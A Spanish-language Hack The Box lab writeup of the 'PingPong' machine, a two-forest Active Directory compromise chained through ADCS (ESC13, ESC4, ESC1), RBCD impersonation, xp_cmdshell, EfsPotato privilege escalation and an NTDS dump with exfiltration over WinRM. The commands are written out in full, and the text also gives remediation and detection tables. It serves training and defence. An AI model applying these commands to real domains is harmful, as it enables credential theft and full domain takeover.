# 🏓 PINGPONG: Full Writeup

**Plataforma:** Hack The Box (Season 10, weekly) · **Dificultad:** Hard
**Tipo:** Active Directory dual-forest (Kerberos-only, sin NTLM)
**Targets:**
- User flag: `C:\Users\C.Carlssen\Desktop\user.txt` en DC2 (PONG.HTB); se lee con SYSTEM en DC2 (post-EfsPotato)
- Root flag: `C:\Users\Administrator\Desktop\root.txt` en DC1 (PING.HTB)

**Resultado:** ambos dominios comprometidos (DA de PING y PONG), ambas flags.

> Flags redactadas por política de HTB (no se publican en writeups públicos).

> Writeup honesto: la vía a PONG es original de esta resolución. El cierre en PING usó una pista externa (writeup de la box) que luego fue verificada y demostrada con método propio (sección "Segunda pasada"). Detalle en la sección de honestidad.

---

## Tabla de contenidos
1. [Resumen ejecutivo](#resumen-ejecutivo)
2. [Arquitectura del lab](#arquitectura-del-lab)
3. [Línea de tiempo](#línea-de-tiempo)
4. [Fase 1: Foothold en PING (ESC13 → WinRM)](#fase-1-foothold-en-ping-esc13--winrm)
5. [Fase 2: PONG, la vía propia (RBCD + SQL + EfsPotato → DA)](#fase-2-pong-la-vía-propia-rbcd--sql--efspotato--da)
6. [Fase 3: Root flag en PING (cross-forest DACL → ESC4 → ESC1 → PKINIT)](#fase-3-root-flag-en-ping-cross-forest-dacl--esc4--esc1--pkinit)
7. [Segunda pasada: el camino con método propio](#segunda-pasada-el-camino-con-método-propio)
8. [Severidad (CVSS aproximado por fase)](#severidad-cvss-aproximado-por-fase)
9. [Remediación](#remediación)
10. [Detección (blue team)](#detección-blue-team)
11. [Lecciones](#lecciones)
12. [Honestidad](#honestidad)

---

## Resumen ejecutivo

PingPong es un lab de AD dual-forest: un trust bidireccional entre **PING.HTB** (DC1, punto de entrada externo) y **PONG.HTB** (DC2, solo interno). NTLM está deshabilitado en ambos dominios, por lo que toda autenticación es Kerberos puro. El reloj del lab corre ~8 horas adelantado respecto a UTC, lo que obliga a compensar con `faketime` en cada operación Kerberos. RC4 está deshabilitado en PONG (claves AES256 obligatorias).

La cadena completa:

```
c.roberts (PING) 
  → ESC13 TemporaryWinRM → WinRM en DC1
  → pivote a PONG (vía propia: RBCD gMSA + SPN NetBIOS del SQL)
  → xp_cmdshell (svc_sql) → EfsPotato → SYSTEM en DC2
  → shadow copy + NTDS → DA PONG
  → R.Martinelli (PONG) es miembro (vía FSP) del grupo custom "CA Managers" de PING, con WriteDacl sobre SmartcardAuthentication
  → ESC4 sobre SmartcardAuthentication → ESC1 (cert de Administrator@ping.htb)
  → PKINIT → DA PING → root flag
```

## Arquitectura del lab

| Elemento | Detalle |
|---|---|
| PING.HTB | DC1: dc1.ping.htb, dual-homed: IP externa variable + 192.168.2.1 (red interna) |
| PONG.HTB | DC2: dc2.pong.htb (192.168.2.2, solo interno) |
| Trust | Bidireccional entre forests |
| NTLM | Deshabilitado en ambos (Kerberos-only) |
| RC4 | Deshabilitado en PONG (AES256) |
| Reloj | ~8h adelantado (faketime relativo: `+8 hours`) |
| Cuentas clave | c.roberts (foothold), C.Carlssen (GenericWrite sobre svc_sql, user flag), C.Adam (sysadmin SQL), R.Martinelli (FSP en grupo "CA Managers" de PING) |

## Línea de tiempo

| Fecha | Hito |
|---|---|
| 2026-08-23 | Enumeración inicial de PING/PONG, ESC13 identificado |
| 2026-08-24 | Credenciales de PONG, gMSA, primera fase de pivote |
| 2026-08-28 | SPN NetBIOS del SQL, RBCD, SQL sysadmin, EfsPotato, SYSTEM en DC2, NTDS |
| 2026-08-29 | DA PONG, user flag, búsqueda de la root flag, cierre con ESC4/ESC1/PKINIT, root flag |

---

## Fase 1: Foothold en PING (ESC13 → WinRM)

Escenario assume-breach: `c.roberts` (grupo IT) con password conocida.

```bash
# 1. TGT de c.roberts (compensación de reloj siempre)
TZ=UTC KRB5_CONFIG=krb5.conf faketime "+8 hours" \
  getTGT.py 'ping.htb/c.roberts:<REDACTED>' -dc-ip <DC1_IP>

# 2. Enumerar ADCS
KRB5CCNAME=c.roberts.ccache faketime "+8 hours" \
  certipy find -u c.roberts@ping.htb -k -no-pass -dc-ip <DC1_IP> -target dc1.ping.htb -vulnerable -stdout
```

Hallazgo: el template **TemporaryWinRM** tiene una *issuance policy* (OID) vinculada al grupo **TempWinRMAccess**. Eso es **ESC13**: al autenticarse por PKINIT con el certificado de ese template, el KDC inyecta la membresía del grupo en el PAC (el grupo vinculado al OID debe ser de scope universal).

```bash
# 3. Enrolar el cert y obtener el TGT PKINIT (el que lleva la membresía)
certipy req -u c.roberts@ping.htb -k -no-pass -ca ping-DC1-CA \
  -template TemporaryWinRM -target dc1.ping.htb
certipy auth -pfx c.roberts.pfx -username c.roberts -domain ping.htb
```

**Detalle que costó descubrir:** el WinRM del DC1 **no** usa el SPN `HTTP/dc1.ping.htb`, usa **`WSMAN/dc1.ping.htb`** (el SPN de la cuenta DC1$, confirmado empíricamente: con el ticket correcto se obtuvo shell WinRM). Pedir tickets con otra service class (HTTP/cifs) no produce un ticket utilizable para el servicio y la autenticación falla. Con el SPN correcto y un cliente Kerberos que lo use, se obtiene shell WinRM como c.roberts.

```bash
KRB5CCNAME=c.roberts.ccache getST.py -k -no-pass -spn WSMAN/dc1.ping.htb 'ping.htb/c.roberts'
# WinRM (cliente con service="WSMAN")
```

## Fase 2: PONG, la vía propia (RBCD + SQL + EfsPotato → DA)

*Esta mitad es original de esta resolución; no sale de ningún writeup.*

> Nota de pivote: el salto inicial de PING a PONG (obtención de las credenciales de C.Carlssen) ocurrió en la fase de enumeración previa: el FSP de c.roberts se agregó al grupo gMSA Managers de PONG (cambio de scope del grupo) para leer el `msDS-ManagedPassword` del gMSA, y el endpoint JEA de DC2 filtró el historial de PowerShell con la password de C.Carlssen. Esta resolución continúa desde C.Carlssen con el RBCD + SQL.

### 2.1 El SPN NetBIOS del SQL

Observación empírica de este lab: la instancia de SQL Server 2022 Express (instancia default, servicio MSSQLSERVER) de DC2 rechazaba los TGS con SPN FQDN (`MSSQLSvc/dc2.pong.htb:1433`) con "Login failed. The login is from an untrusted domain and cannot be used with Windows authentication." (error 18452) en cinco intentos, y aceptó el TGS con el SPN **NetBIOS** (`MSSQLSvc/DC2:1433`) que la cuenta `svc_sql` registra al habilitar TCP. La lección: verificar qué SPN registró realmente el servicio antes de asumir el FQDN. La solución fue doble:

1. Agregar el SPN NetBIOS a la cuenta `svc_sql` (modificación del atributo `servicePrincipalName` vía S.DS.P). El permiso salía de **C.Carlssen**, que tiene GenericWrite sobre `svc_sql` (lo mismo habilitó el RBCD del gMSA).
2. Obtener un TGS NetBIOS de **C.Adam** (miembro de Database Admins = sysadmin SQL) usando el RBCD del gMSA + S4U2Proxy. La clave AES256 del gMSA se deriva del blob `msDS-ManagedPassword` (salt `PONG.HTBhost<dnsHostName>` con PBKDF2-HMAC-SHA1).

```bash
# TGT del gMSA (la clave AES256 sale del blob msDS-ManagedPassword)
getTGT.py 'pong.htb/Pong_gMSA$' -aesKey <AES256_GMSA> -dc-ip 127.0.0.1

# TGS de C.Adam para MSSQLSvc/DC2:1433 vía S4U2Proxy, autenticado con las llaves del gMSA
KRB5CCNAME=Pong_gMSA$.ccache getST.py -k -no-pass -spn MSSQLSvc/DC2:1433 -impersonate C.Adam \
  'pong.htb/Pong_gMSA$'
# /etc/hosts: 127.0.0.1 DC2  (para que el target arme el SPN NetBIOS)
mssqlclient.py -k -no-pass -dc-ip 127.0.0.1 'pong.htb/C.Adam@DC2'
```

### 2.2 De sysadmin SQL a SYSTEM

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');      -- 1
EXEC xp_cmdshell 'whoami';                -- pong\svc_sql
```

`svc_sql` no es admin local, pero tiene **SeImpersonatePrivilege**. Sin transferencia de binarios posible (HTTP y SMB de salida bloqueados), el exploit **EfsPotato** se compiló en el propio host:

1. Source en chunks base64 vía `xp_cmdshell` → `certutil -decode`.
2. Compilar con `csc.exe` del .NET Framework (C:\Windows\Temp está denegado para la cuenta de servicio; usar `C:\ProgramData\efs\`).
3. Ejecutar: `efs.exe "<cmd>"` (sintaxis sin `-c`, pipe `lsarpc` por defecto) → **NT AUTHORITY\SYSTEM**.

### 2.3 Dump del NTDS y exfiltración

```bash
vssadmin create shadow /for=C:          # anotar el GUID de la shadow copy
vssadmin list shadows                   # obtener el nombre HarddiskVolumeShadowCopy<N>
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\ProgramData\efs\ntds.dit
reg save HKLM\SYSTEM C:\ProgramData\efs\SYSTEM
reg save HKLM\SECURITY C:\ProgramData\efs\SECURITY
```

SMB y HTTP muertos. Dos problemas separados con las herramientas WinRM: evil-winrm 3.9 roto (bug de la gema winrm 2.3.9 con ruby 3.4) y el gssapi ruby sin soporte para tickets AES. La exfiltración se hizo por **WinRM chunked** con el cliente ruby contra DC2 (tickets RC4 de C.Carlssen): se subió `MaxEnvelopeSizekb` del WSMAN a 8192 y se leyó el archivo en rangos de 4 MB con un script PowerShell, decodificando base64 en el atacante. Con `secretsdump -ntds -system -security LOCAL` se obtuvo **DA PONG**: Administrator, krbtgt, 20 cuentas y la trust key. De bonus, el hive SECURITY reveló la password del servicio SQL en claro (LSA secret `_SC_MSSQLSERVER`).

## Fase 3: Root flag en PING (cross-forest DACL → ESC4 → ESC1 → PKINIT)

La root flag está en el Desktop del Administrator de **PING**, no de PONG. El paso final: una cuenta de PONG, **R.Martinelli**, es miembro (vía Foreign Security Principal) del grupo custom **"CA Managers"** de PING, que tiene un ACE de **WriteDacl/WriteOwner sobre el template SmartcardAuthentication**. Su clave AES256 salió del NTDS de PONG.

### 3.1 Tickets cross-realm de R.Martinelli

```bash
getTGT.py 'pong.htb/r.martinelli' -aesKey <AES256_RMARTINELLI> -dc-ip 127.0.0.1
getST.py -k -no-pass -spn 'krbtgt/PING.HTB@PING.HTB' 'pong.htb/r.martinelli'
kvno -S ldap dc1.ping.htb
# merge de ccaches: TGT + referral + TGS ldap en un solo archivo
```

Con el ccache mergeado, el **bind LDAP GSSAPI cross-forest** contra dc1.ping.htb funciona. El mecanismo: el SID nativo de R.Martinelli (no SIDHistory) está representado en PING vía un **Foreign Security Principal**, y ese FSP fue agregado al grupo custom **CA Managers**. El SID filtering del trust (que solo filtra SIDHistory) no aplica acá; la membresía se evalúa normalmente contra el FSP.

### 3.2 ESC4: modificar SmartcardAuthentication

El grupo "CA Managers" posee WriteDacl/WriteOwner sobre el template, y R.Martinelli (miembro vía FSP) puede modificarlo:

```bash
# 1. Modificar los flags del template (bind LDAP GSSAPI cross-forest como R.Martinelli):
#    ldap3 modify de CN=SmartcardAuthentication,CN=Certificate Templates,...
#      msPKI-Certificate-Name-Flag = 1   (ENROLLEE_SUPPLIES_SUBJECT)
#      msPKI-Enrollment-Flag = 0

# 2. Otorgar enrollment/control a c.roberts sobre el template:
bloodyAD add genericAll \
  'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
  'S-1-5-21-750635624-2058721901-1932338391-2617'   # c.roberts
```

Notas de infraestructura: `bloodyAD` usa dnspython y no lee `/etc/hosts`; se usó un resolv.conf temporal con el nameserver del DC1. El enrollment del CA va por el SOCKS del chisel (proxychains + hosts temporal `192.168.2.1 dc1.ping.htb`), porque el puerto 135 del DC1 está filtrado desde afuera.

### 3.3 ESC1: certificado de Administrator

```bash
certipy req -u c.roberts@ping.htb -k -no-pass -ca ping-DC1-CA \
  -template SmartcardAuthentication \
  -upn 'Administrator@ping.htb' \
  -sid 'S-1-5-21-750635624-2058721901-1932338391-500'   # objectSID del USER
```

El `-sid` debe ser el **objectSID del usuario** (500), no el del grupo Domain Admins (512). El strong mapping de KB5014754 exige que UPN y SID apunten al mismo objeto.

### 3.4 PKINIT → DA de PING

```bash
certipy auth -pfx administrator.pfx -username administrator -domain ping.htb
getST.py -k -no-pass -spn WSMAN/dc1.ping.htb 'ping.htb/administrator'
# WinRM → whoami → ping\administrator (Domain Admins)
# type C:\Users\Administrator\Desktop\root.txt
```

**Root flag:** `[REDACTED]` (política de HTB)

---

## Segunda pasada: el camino con método propio

> Post-mortem metodológico: la Fase 3 describe el ataque ejecutado; esta sección demuestra que el mismo vector era visible con enumeración sistemática. No es un hallazgo duplicado, es la verificación de reproducibilidad.

Después de resolver el lab, se verificó que la pieza final era visible con enumeración sistemática, sin pistas externas:

1. **Inventario del NTDS de PONG**: cada cuenta con su SID (R.Martinelli = `S-1-5-21-2410575906-...-1124`).
2. **DACLs de los templates de PING**: `SmartcardAuthentication` tiene un ACE de **WriteDacl/WriteOwner** para el grupo **"CA Managers"** (RID 2627), un grupo custom e inmediatamente sospechoso.
3. **Miembros de "CA Managers"**: incluye el **Foreign Security Principal** de R.Martinelli de PONG.
4. El SID nativo de R.Martinelli (representado por el FSP) se evalúa normalmente contra el grupo en PING: es miembro efectivo de CA Managers → WriteDacl sobre el template → ESC4 → ESC1 → DA.

La firma a buscar en cualquier lab de este estilo: **grupos custom cuyos miembros incluyen FSPs de otros dominios**.

---

## Severidad (CVSS aproximado por fase)

| Fase | Vector | Severidad | CVSS aprox. |
|---|---|---|---|
| ESC13 (TemporaryWinRM) | Elevación de privilegios vía ADCS con inyección de membresía de grupo en PAC | Alta | 8.8 |
| RBCD + GenericWrite sobre svc_sql + SQL sysadmin | Compromiso total del dominio PONG | Crítica | 9.8 |
| EfsPotato (SeImpersonate) | SYSTEM en DC2 | Alta | 7.8 |
| FSP en grupo "CA Managers" + ESC4 + ESC1 | Compromiso total del dominio PING vía trust | Crítica | 9.8 |

> Son estimaciones de contexto (lab de entrenamiento), no un assessment formal.

## Remediación

| Hallazgo | Remediación |
|---|---|
| ESC13 TemporaryWinRM | Eliminar el vínculo de issuance policy del template al grupo, o restringir el enrollment solo a cuentas necesarias |
| ESC4/ESC1 SmartcardAuthentication | Quitar WriteDacl/WriteOwner de grupos no privilegiados ("CA Managers") y volver a restringir `msPKI-Certificate-Name-Flag` (sin ENROLLEE_SUPPLIES_SUBJECT) |
| GenericWrite sobre svc_sql | Auditar ACEs sobre cuentas de servicio; mínimo privilegio |
| FSP en grupos locales | Revisar Foreign Security Principals en grupos con permisos sobre infraestructura sensible (ADCS) |
| SPN de servicios | Verificar los SPNs registrados reales (`setspn -L`) y monitorear cambios |
| KB5014754 | Implementar el enforcement estricto del strong mapping (evita UPN/SAN mismatch en PKINIT) |

## Detección (blue team)

| Actividad | Fuente de detección |
|---|---|
| Modificación de `servicePrincipalName` (SPN NetBIOS agregado) | Eventos de cambio de atributos (LDAP) |
| Requests de TGS con `msDS-AllowedToActOnBehalfOfOtherIdentity` | Evento 4769 con flags de S4U |
| Habilitación de `xp_cmdshell` + ejecución | Eventos de SQL Server / auditoría de procesos |
| `vssadmin create shadow` + lectura de NTDS | Evento 7036 / acceso a archivos |
| Modificación de un template de ADCS (ESC4) | Eventos 4899/4900 (template update) y/o 5136 (modify de objeto DS) |
| Request de certificado con UPN/SAN ajeno | Evento 4886 con UPN mismatch |
| PKINIT de una cuenta con certificado recién emitido | Evento 4768 con cert info |
| `MaxEnvelopeSizekb` elevado en WSMAN | Cambio de configuración del servicio |

## Lecciones

1. **SPN de servicios en Server 2022**: el WinRM usa `WSMAN/<fqdn>`; verificar la existencia real del SPN antes de culpar al Kerberos.
2. **Cross-forest con FSP**: el SID nativo de una cuenta foránea representado como Foreign Security Principal y agregado a un grupo local se evalúa normal (el SID filtering solo filtra SIDHistory, no aplica acá).
3. **`certipy find -vulnerable` puede no atribuir el ESC4 cross-forest**: el principal con WriteDacl es un Foreign Security Principal que no se resuelve como cuenta del atacante. Mirar los DACLs directamente y los miembros de grupos custom.
4. **KB5014754**: en el `certipy req`, `-sid` = objectSID del usuario (500), no el del grupo (512).
5. **La instancia SQL (Express, default) validó el SPN NetBIOS del TGS**, no el FQDN (en este lab). Verificar los SPNs reales registrados por el servicio.
6. **EfsPotato** funcionó en este DC2 (Server 2022); compilar en el host con `csc.exe` cuando no hay transferencia de binarios.
7. **`C:\Windows\Temp` denegado** para cuentas de servicio no-admin: usar `C:\ProgramData`.
8. **Variables de entorno SIEMPRE antes de `faketime`**: `VAR=x faketime "+8 hours" cmd`.
9. **gssapi ruby no maneja tickets AES**: usar libkrb5 (curl/kvno) o RC4 cuando el KDC lo permita.
10. **bloodyAD usa dnspython**, no `/etc/hosts`: resolv.conf temporal con el nameserver del DC.

## Honestidad

- **100% propio:** la vía completa a PONG (SPN NetBIOS, RBCD, EfsPotato en host, exfiltración WinRM chunked), el hallazgo del SPN `WSMAN/`, toda la infraestructura (túneles, proxychains, merge de ccaches, flujo LDAP cross-forest), la user flag, DA PONG.
- **Pista externa (writeup de la box, concedido tras horas):** que R.Martinelli era la llave del final. El dato estaba en los propios archivos (NTDS de PONG) y se verificó después con método propio (grupo CA Managers + FSP).
- **Autocrítica:** se descartó a R.Martinelli por un pre-juicio de la enumeración ("sin grupos/SPN") sin verificar permisos cross-forest; se cerró el cross-realm por el SID filtering de los servicios sin probar la variante viva (FSPs en grupos/DACLs); faltó el inventario cross-forest del NTDS.

**Lección permanente:** después de dumpear un NTDS, inventariar los permisos cross-forest de cada cuenta. Los grupos custom con FSPs de otros dominios son la firma del lab.

---

*Resuelto por Camarón 🦐 con el aguante de su padre. Escrito con EMET, Anavah y Tiferet.*
